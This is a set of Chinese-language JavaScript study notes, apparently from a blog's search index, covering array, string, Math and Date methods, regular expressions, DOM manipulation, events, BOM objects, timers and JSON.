数组的存储性能比普通对象要好，在开发中我们经常使用数组来存储一些数据 创建数组 var arr = new Array() 使用typeof 检查一个数组时，会返回object 向数组中添加元素 语法： 数组[索引] = 值 arr[0] = 100 读取数组中的元素 语法： 数组[索引] arr[0] 读取不存在的索引，不会报错，会返回undefined 获取数组的长度 - 可以使用length属性来获取数组的长度（元素的个数） 语法： 数组.length arr.length 对于连续的数组，使用length可以获取到数组的长度(元素的个数) 对于非连续的数组，使用length会获取到数组的最大的索引+1 尽量不创建非连续数组 向数组的最后一位添加元素 语法： 数组[arr.length] = 100 arr[arr.length] = 100 使用字面量来创建数组 语法： var arr = [] 使用字面量创建数组时，可以在创建时就指定数组中的元素 var arr = [1,2,3,4,5] 操作数组的方法 push() - 该方法可以向数组的末尾添加一个或多个元素，并返回数组的新的长度 - 可以将要添加的元素 作为参数传递，这样这些元素会自动添加到数组末尾 - 该方法会将数组新的长度作为返回值返回 pop() - 该方法可以删除数组的最后一个元素，并将被删除的元素作为返回值返回 unshift() - 向数组开头添加一个或多个元素，并返回新的数组长度 - 向前边插入元素以后，其他的元素索引会依次调整 shift() - 可以删除数组的第一个元素，并将被删除的元素作为返回值返回 slice() - 可以用来从数组提取指定元素 - 该方法不会改变元素数组，而是将截取到的元素封装到一个新数组中返回 - 参数： 1. 截取开始的位置的索引，包含开始索引 2. 截取结束的位置的索引，不包含结束索引 - 第二个参数可以省略不写，此时会截取从开始索引往后的所有元素 - 索引可以传递一个负值，如果传递一个负值，则从后往前计算 -1 代表倒数第一个 -2 代表倒数第二个 splice() - 可以用于删除数组中的指定元素 - 使用splice()会影响到原数组，会将指定元素从原数组中删除 并将被删除的元素作为返回值返回 - 参数： 第一个，表示开始位置的索引 第二个，表示删除的数量 第三个及以后 可以传递一些新的元素，这些元素将会自动插入到开始位置索引前边 concat() - 可以连接两个或多个数组，并将新的数组返回 - 该方法不会对原数组产生影响 join() - 该方法可以将数组转换为一个字符串 - 该方法不会对原数组产生影响，而是将转换后的字符串作为结果返回 - 再join() 中可以指定一个字符串作为参数，这个字符串将会成为数组中元素的连接符 如果不指定连接符，则默认,作为连接符 reverse() - 该方法用来反转数组（前面的去后边，后边的去前边） - 该方法会直接修改原数组 sort() - 可以用来对数组中的元素进行排序 - 也会影响原数组，默认会按照Unicode编码进行排序 forEach() 遍历数组 - 这个方法只支持IE8以上的浏览器 IE8及以下的浏览器均不支持该方法，所有如果需要兼容IE8，则不要使用forEach - 方法需要一个函数作为参数 - 像这种函数，由我们创建但是不由我们调用，我们称回调函数 - 数组中有几个元素函数就会执行几次，每次执行时，浏览器会将遍历到的元素 以实参的形式传递进来，我们可以定义形参，来读取这些内容 - 浏览器会在回调函数中传递三个参数： 第一个参数，就是当前正在遍历的元素 第二个参数，就是当前正在遍历的元素的索引 第三个参数，就是正在遍历的数组（整个数组对象） Date对象 - 在JS中使用Date对象来表示一个时间 创建一个Date对象 var d = new Date(); 创建一个指定的时间对象 日期的格式 月份/日/年 时:分:秒 var d2 = new Date(&quot;2/18/2011 11:10:30&quot;); 日期获取的几个方法 getDate() - 获取当前日期对象是几日 getDay() - 获取当前日期对象时周几 - 会返回一个0-6的值 0 表示周日 getMonth() - 获取当前时间对象的月份 - 会返回一个0-11的值 0 表示1月 getFullYear() - 获取当前日期对象的年份 getTime() - 获取当前日期对象的时间戳 - 时间戳，指的是从格林威治标准时间的1970年1月1日，0时0分0秒 到当前日期所花费的毫秒数（1秒 = 1000毫秒） - 计算机底层在保存时间时使用都是时间戳 Math对象 - Math和其他的对象不同，它不是一个构造函数， 它属于一个工具类不用创建对象，它里边封装了数学运算相关的属性和方法 - 比如 Math.PI 表示的圆周率 方法： abs() - 可以用来计算一个数的绝对值 Math.ceil() - 可以对一个数进行向上取整，小数位只有有值就自动进1 Math.floor() - 可以对一个数进行向下取整，小数部分会被舍掉 Math.round() - 可以对一个数进行四舍五入取整 Math.random() - 可以用来生成一个0-1之间的随机数 - 生成一个0-10的随机数 - 生成一个0-x之间的随机数 Math.round(Math.random()*x) - 生成一个1-10 - 生成一个x-y之间的随机数 Math.round(Math.random()*(y-x)+x) Math.max() 可以获取多个数中的最大值 Math.min() 可以获取多个数中的最小值 Math.pow(x,y) 返回x的y次幂 Math.sqrt() 用于对一个数进行开方运算 包装类 在JS中为我们提供了三个包装类，通过这三个包装类可以将基本数据类型的数据转换为对象 方法： String() - 可以将基本数据类型字符串转换为String对象 Number() - 可以将基本数据类型的数字转换为Number对象 Boolean() - 可以将基本数据类型的布尔值转换为Boolean对象 但是注意：我们在实际应用中不会使用基本数据类型的对象， 如果使用基本数据类型的对象，在做一些比较时可能会带来一些不可预期的结果 注意事项： 方法和属性只能添加给对象，不能添加给基本数据类型 当我们对一些基本数据类型的值去调用属性和方法时， 浏览器会临时使用包装类将其转换为对象，然后在调用对象的属性和方法 调用完以后，在将其转换为基本数据类型 操作字符串的相关方法 属性： length - 可以用来获取字符串的长度 方法： charAt() - 可以返回字符串中指定位置的字符 - 根据索引获取指定的字符 charCodeAt() - 获取指定位置字符的字符编码（Unicode编码） formCharCode() - 可以根据字符编码去获取字符 concat() - 可以用来连接两个或多个字符串 - 作用和+一样 indexof() - 该方法可以检索一个字符串中是否含有指定内容 - 如果字符串中含有该内容，则会返回其第一次出现的索引 如果没有找到指定的内容，则返回-1 - 可以指定一个第二个参数，指定开始查找的位置 lastIndexOf(); - 该方法的用法和indexOf()一样， 不同的是indexOf是从前往后找， 而lastIndexOf是从后往前找 - 也可以指定开始查找的位置 slice() - 可以从字符串中截取指定的内容 - 不会影响原字符串，而是将截取到内容返回 - 参数： 第一个，开始位置的索引（包括开始位置） 第二个，结束位置的索引（不包括结束位置） - 如果省略第二个参数，则会截取到后边所有的 - 也可以传递一个负数作为参数，负数的话将会从后边计算 substring() - 可以用来截取一个字符串，可以slice()类似 - 参数： - 第一个：开始截取位置的索引（包括开始位置） - 第二个：结束位置的索引（不包括结束位置） - 不同的是这个方法不能接受负值作为参数， 如果传递了一个负值，则默认使用0 - 而且他还自动调整参数的位置，如果第二个参数小于第一个，则自动交换 substr() - 用来截取字符串 - 参数： 1.截取开始位置的索引 2.截取的长度 split() - 可以将一个字符串拆分为一个数组 - 参数： -需要一个字符串作为参数，将会根据该字符串去拆分数组 toUpperCase() - 将一个字符串转换为大写并返回 toLowerCase() -将一个字符串转换为小写并返回 正则表达式 - 正则表达式用于定义一些字符串的规则， 计算机可以根据正则表达式，来检查一个字符串是否符合规则 获取将字符串中符合规则的内容提取出来 创建正则表达式的对象 使用构造函数创建正则对象 语法： var 变量 = new RegExp(&apos;正则表达式&apos;, &apos;匹配模式&apos;); 使用typeof检查正则对象，会返回object 使用字面量创建正则对象 var patt = /正则表达式/匹配模式 修饰符/匹配模式 i 执行对大小写不敏感的匹配 g 执行全局匹配（查找所有匹配而非在找到第一个匹配后停止） m 执行多行匹配 方括号 [abc] 查找方括号之间的任何字符 [^abc] 查找任何不在方括号之间的字符 [0-9] 查找任何从 0 到 9 的数字 [a-z] 查找任何从小写 a 到 小写 z 的字符 [A-Z] 查找任何从大写 A 到 大写 Z的字符 (reg|blue|green) 查找任何指定的选项 元字符 . 查找单个字符，除了换行和行结束符 \w 查找单词字符 \W 查找非单词字符 \d 查找数字 \D 查找非数字字符 \s 查找空白字符 \S 查找非空白字符 ... 量词 n+ 匹配任何包含至少一个 n 的字符串 n* 匹配任何包含零个或多个 n 的 字符串 n? 匹配任何包含零个或一个 n的 字符串 ... RegExp对象属性 global RegExp 对象是否具有标志g ignoreCase RegExp 对象是否具有标志i lastIndex 一个整数，标示开始下一次匹配的字符位置 multiline RegExp 对象是否具有标志 m 正则表达式的方法 compile() - 编译正则表达式 exec() - 匹配字符串中指定的值，返回找到的值，并确定其位置 test() - 使用这个方法可以用来检查一个字符串是否符合正则表达式的规则， 如果符合则返回true，否则返回false 支持正则表达式的String对象的方法 search() - 匹配与正则表达式想匹配的值 match() - 找到一个或多个正则表达式的匹配 replace() - 替换与正则表达式匹配的字串 split() - 把字符串分割为字符串数组(重点内容)DOM (全称 Document Object Model 文档对象模型) 核心思想：找对象，搞对象 - 文档 文档表示的就是整个的HTML网页文档 - 对象 对象表示将网页中的每个部分都转换为了一个对象 - 模型 使用模型来表示对象之间的关系，这样方便我们获取对象 节点(Node) - 构成HTML文档最基本的单元 常用节点分为四类 - 文档节点 整个HTML文档 - 元素节点 HTML文档中的HTML标签 - 属性节点 元素的属性 - 文本节点 HTML标签中的文本内容 获取元素节点 - 通过document对象调用 getElementById() - 通过id属性获取一个元素节点对象 getElementsByTagName() - 通过标签名获取一组元素节点对象 getElementsByName() - 通过name属性获取一组元素节点对象 获取元素节点的子节点 - 通过具体的元素节点调用 getElementsByTagName - 方法，返回当前节点的指定标签名后代节点 childNodes - 属性，表示当前节点的所有子节点 children - 属性， 表示当前节点的所有有元素节点 firstChild - 属性，表示当前节点的第一个子节点 lastChild - 属性，表示当前节点的最后一个子节点 获取父节点和兄弟节点 - 通过具体的节点调用 parentNode - 属性，表示当前节点的父节点 previousSibling - 属性，表示当前节点的前一个兄弟节点 nextSibling - 属性，表示当前节点的后一个兄弟节点 元素节点的属性 - 获取元素节点的值 元素对象.属性名 element.value element.id element.className - 设置元素节点的值 元素对象.属性名 = 新的值 element.value = &apos;值&apos; element.id = &apos;值&apos; element.className = &apos;值&apos; 其他属性 nodeValue - 文本节点可以通过nodeValue属性获取和设置文本节点的内容 innerHTML - 元素节点通过该属性获取和设置标签内部的html代码 DOM查询的其余方法 document.body 保存的是body的引用 document.documentElement 保存的是html根标签 document.all 代表页面中所有的元素 getElementByClassName() 根据元素的class属性值查询一组元素节点对象 但是该方法不支持IE8及以下的浏览器 getElementsByTagName() 可以指定标签名来获取页面中所有的指定标签 querySelector() - 需要一个选择器的字符串做为参数，可以根据一个css选择器来查询一个元素节点对象 - 支持IE8及以上 - 只返回唯一的一个元素，如果满足条件的元素有多个，也只会返回一个 querySelectorAll() - 该方法和querySelector()类似，不同的是它会将符合条件的元素封装到一个数组中返回 - 即使符合条件的元素只有一个，它也会返回数组 DOM增删改方法 document.createElement() - 可以用于创建一个元素节点对象 - 它需要一个标签名作为参数，将会根据该标签名创建元素节点对象 并将创建好的对象作为返回值返回 document.createTextNode() - 用来创建一个文本节点对象 - 需要一个文本内容作为参数，将会根据该内容创建文本节点，并将新的节点返回 appendChild() - 向一个父节点中添加一个新的子节点 - 用法： 父节点.appendChild(子节点); insertBefore() - 可以在指定的子节点前插入新的子节点 - 语法： 父节点.insertBefore(新节点, 旧节点); replaceChild() - 可以使用指定的子节点替换已有的子节点 - 语法： 父节点.replaceChild(新节点, 旧节点); removeChild() - 可以删除一个子节点 - 语法： 父节点.removeChild(子节点); 或 子节点.parentNode.removeChild(子节点); JS修改元素的样式 语法： 元素.style.样式名 = 样式值 注意事项： 如果CSS的样式名中含有-这种名称在JS中是不合法的， 比如background-color,要想使用，需要将这种样式名改 为驼峰命名法，去掉-，然后将-后的字母大写 说明： 通过style属性设置的样式都是内联样式，而内联样式有较高的 优先级，通过JS修改的样式往往会立即显示 但是如果在样式中写了!important, 则此时样式会有最高的优先级 即使通过js也不能覆盖该样式，此时将会导致JS修改样式失效 所以尽量不会为样式添加！important JS读取元素的样式 语法： 元素.style.样式名 说明： 通过style属性设置和读取的都是内联样式，无法读取样式表中的样式 JS读取元素当前显示的样式 - 通过currentStyle 和 getComputedStyle() 读取到的样式都只是只读的， 不能修改，如果要修改必须通过style属性 currentStyle 语法： 元素.currentStyle.样式名 说明： 它可以用来读取当前正在显示的样式，如果该元素没有设置该样式， 则获取它的默认值 注意事项： currentStyle只有IE浏览器支持，其他浏览器都不支持 getComputedStyle() 说明： 这个方法来获取元素当前的样式，这个方法是window的方法，可以直接使用 该方法会返回一个对象，对象中封装了当前元素对应的样式， 可通过对象.样式名来读取样式 如果获取的样式没有设置，则会获取到真实的值，而不是默认值 比如: 没有设置width，它不会获取到auto，而是一个长度 语法： getComputedStyle(box1, null) 参数： 第一个： 要获取样式的元素 第二个： 可以传递一个伪元素，一般都传null 注意事项： 该方法不支持IE8及以下的浏览器 事件(Event) 常用事件 onclick - 单击事件 onmousemove - 该事件将会在鼠标在元素中移动时被触发 onmousedown - 该事件将会在鼠标被按下时被触发 onmouseup - 该事件将会在鼠标被松开时触发 鼠标/键盘属性 clientX和clientY - 用于获取鼠标在当前的可见窗口的坐标 pageX和pageY - 用于获取鼠标相对于当前页面的坐标 但是这两个属性在IE8中不支持 事件的冒泡(Bubble) - 所谓的冒泡指的就是事件的向上传导，当后代元素上的事件被触发时，其祖先元素的相同事件也会触发 - 在开发中大部分情况冒泡都是有用的，如果不希望发生事件冒泡可以通过事件对象来取消冒泡 取消冒泡 可以将事件对象的cancelBubble设置为true, 即可取消冒泡 语法： event.cancelBubble = true; 事件的委派 - 指将事件统一绑定给元素的共同的祖先元素，这样当后代元素上的事件触发时，会一直冒泡到祖先元素 从而通过祖先元素的响应函数来处理事件。 - 事件委派是利用了冒泡，通过委派可以减少事件绑定的次数，提高程序的性能 关键点 target - event中的target表示的触发事件的对象 事件的绑定 addEventListener() - 特点： 可以绑定多个单击响应函数 - 这个方法不支持IE8以以下浏览器 - 通过这个方法可以为元素绑定响应函数 - 参数： 1. 事件的字符串，不要on onclick不要on 只要click 2. 回调函数，当事件触发时该函数会被调用 3. 是否在捕获阶段触发事件，需要一个布尔值，一般都传false attachEvent() - 在IE8中可以使用 - 绑定多个单击响应函数 - 参数： 1. 事件的字符串, 要on 2. 回调函数 - 这个方法也可以同时为一个事件绑定多个处理函数 不同的是它是后绑定先执行，执行顺序和addEventListener() 相反 事件的传播(了解) 取消浏览器的默认行为： 第一种方法： return false 第二种方法： event.preventDefault() 注意： IE8 不支持 鼠标事件 拖拽 注意事项： 当我么拖拽一个网页中的内容时，浏览器会默认去搜索引擎中搜索内容， 这个行为会导致拖拽功能的异常，这个是浏览器提供的默认行为， 如果不希望发生这个行为，则可以通过 return false 来取消默认行为 但是 不对IE8起作用 IE8解决方法： 使用setCapture() 方法 将所有的拖拽事件 捕获到 自己身上 setCaptrue() - 只有IE支持，但是火狐中调用时不会报错， 而如果使用chrom调用，会报错 releaseCapture() - 取消对事件的捕获 滚轮事件 onmousewheel - 鼠标滚轮的事件 ，会在滚轮滚动时触发 - 但是火狐不支持该属性 DOMMouseScroll - 鼠标滚轮的事件 - 可以支持火狐 - 但是该事件需要通过addEventListener() 函数来绑定 事件对象 event.wheelDelta - 可以获取鼠标滚轮滚动的方向 - 向上滚 120 向下滚 -120 - 这个属性在火狐中不支持 event.detail - 可以获取鼠标滚轮滚动的方向 - 支持火狐 - 向上滚 -3 向下滚 3 键盘事件 onkeydown - 按键被按下 - 对于onkeydown来说如果一直按着某个按键不松手，则事件会一直触发 当onkeydown连续触发时，第一次和第二次之间会间隔稍微长一点，其他都会非常快 这种设计是为了防止误操作发生 onkeyup - 按键被松开 键盘事件一般都会绑定给一些可以获取到焦点的对象或者是document 事件对象 event.keyCode - 获取按键的编码 altKey ctrlKey shiftKey - 这三个用来判断 alt ctrl 和 shift 是否被按下 如果按下则返回true，否则返回false (重点内容)BOM(浏览器对象模型) - BOM可以使我么通过js来操作浏览器 - 在BOM中为我们提供了一组对象，用来完成对浏览器的操作 - BOM对象 Window - 代表的是整个浏览器的窗口，同时window也是网页中的全局对象 Navigator - 代表的当前浏览器的信息，通过该对象可以来识别不同的浏览器 Location - 代表当前浏览器的地址栏信息，通过Location可以获取地址栏信息，或者操作浏览器跳转页面 History - 代表浏览器的历史记录，可以通过该对象来操作浏览器的历史记录 由于隐私原因，该对象不能获取到具体的历史记录，只能操作浏览器向前或向后翻页 而且该操作只在当成访问时有效 Screen - 代表用户的屏幕的信息，通过该对象可以获取到用户的显示器的相关的信息 - 这些BOM对象在浏览器中都是作为window对象的属性保存的， 可以通过window对象来使用，也可以直接使用 Navigator - 代表的当前浏览器的信息，通过该对象可以来识别不同的浏览器 - 由于历史原因，Navigator对象中大部分属性都已经不能帮助我们识别浏览器了 - 一般只会使用userAgent来判断浏览器的信息， userAgent是一个字符串，这个字符串中包含有用来描述浏览器信息的内容， 不同的浏览器会有不同的userAgent 属性 userAgent - 返回由客户机发送服务器的 user-agent 头部的值。 - 用法： Navigator.userAgent History - 对象可以用来操作浏览器向前或向后翻页 属性 length - 可以获取到当前访问的链接数量 方法 back() - 可以用来回退到上一个页面，作用和浏览器的回退按钮一样 forward() - 可以跳转下一个页面，作用和浏览器的前进按钮一样 go() - 可以用来跳转到指定的页面 - 它需要一个整数作为参数 1: 表示向前跳转一个页面 相当于forward() 2: 表示向前跳转两个页面 -1: 表示向后跳转一个页面 -2: 表向后跳转两个页面 Location - 该对象中封装了浏览器的地址栏的信息 - 直接输出location，则会获取到地址栏的信息(当前页面的完整路径) 属性 hostname - 设置或返回当前URL的主机名 方法 assign() - 用来跳转到其他的页面，作用和直接修改location一样 reload() - 用于重新加载当前页面，作用和刷新按钮一样 - 如果在方法中传递一个true，作为参数，则会强制清空缓存刷新页面 replace() - 可以使用一个新的页面替换当前页面，调用完毕也会跳转页面 不好生成历史记录，不能使用回退按钮回退 定时器 setInterval() - 定时调用 - 可以将一个函数，每隔一段时间执行一次 - 参数： 1. 回调函数，该函数会每隔一段时间被调用一次 2. 每次调用间隔的时间，单位是毫秒 - 返回值 返回一个Number类型的数据 这个数字用来作为定时器的唯一标识 setInterval(function(){}, 1000); clearInterval() - 用来关闭一个定时器 - 方法中需要一个定时器的标识作为参数，这样会关闭标识对应的定时器 延时调用 - 延时调用一个函数不马上执行，而是隔一段时间以后在执行，而且只会执行一次 - 延时调用与定时调用区别：定时调用会执行多次，而延时调用只会执行一次 - 说明：延时调用河定时调用实际上是可以互相代替的，在开发中可以根据自己需要去选择 setTimeout() - 用来开启一个延时调用 - 参数同定时调用一致 clearTimeout() - 用来关闭一个延时调用JSON(JS对象表示法) - js中的对象只有js自己认识，其他的语言都不认识 - JSON就是一个特殊格式的字符串，这个字符串可以被任意的语言所识别 并且可以转换为任意语言中的对象，JSON在开发中主要用来数据交互 - JSON - Javascript Object Notation JS对象表示法 - JSON 和 JS对象的格式一样，只不过JSON字符串中的属性名必须加双引号 其他的和JS语法一致 - JSON分类 1. 对象 {} 2. 数组 {} - JSON中允许的值 1. 字符串 2. 数值 3. 布尔值 4. null 5. 对象 6. 数组 - JSON的转换 - 将JSON字符串转换为JS中的对象 - 在JS中，为我们提供了一个工具类，就叫JSON 这个对象可以帮助我们将JSON转换为JS对象，也可以将一个JS对象转换为JSON - JSON --&gt; js对象 方法： JSON.parse() - 可以将JSON字符串转换为js对象 - 它需要一个JSON字符串作为参数， 会将该字符串转换为JS对象并返回 - js对象 --&gt; JSON 方法： JSON.stringify() - 可以将一个JS对象转换为JSON字符串 - 需要一个js对象作为参数，会返回一个JSON字符串 注意事项： JSON这个对象在IE7及以下的浏览器中不支持，有些浏览器中调用会报错 eval() - 这个函数可以用来执行一段字符串形式的JS代码，并将执行结果返回 - 如果使用eval()执行的字符串中含有{}, 它会将{}当成是代码块 如果不希望当成代码块来执行，则需要在字符串外加一个() - eval() 这个函数的功能很强大, 可以直接执行一个字符中的JS代码 但是在开发中尽量不要使用，首先它的执行性能比较差，然后它还存在安全隐患。]]></content>
      <categories>
        <category>Javascript</category>
      </categories>
      <tags>
        <tag>javascript学习</tag>
      </tags>
  </entry>
</search>
